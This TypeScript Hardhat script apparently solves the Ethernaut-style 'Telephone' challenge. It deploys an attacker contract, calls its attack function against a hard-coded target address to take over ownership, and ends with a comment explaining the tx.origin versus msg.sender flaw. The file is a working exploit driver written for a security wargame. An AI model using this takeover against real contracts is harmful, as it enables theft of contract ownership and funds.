import { Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/Telephone/Telephone.sol/Telephone.json";

function setTargetContract() {
  const contractAddress = "0x3cBC99a8cfC61670075AD3d5155F29Cdd21777aF";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const TelephoneAttacker = await deployContract("TelephoneAttacker", attacker);
  const TelephoneTarget = setTargetContract();
  console.log("Attack starts");
  const pendingTx = await TelephoneAttacker.attack();
  await pendingTx.wait();

  const owner = await TelephoneTarget.connect(attacker).owner();

  console.log("Success: ", owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Here msg.sender is the attacking contract address, tx.origin is the EOA initiating
the transaction.
*/
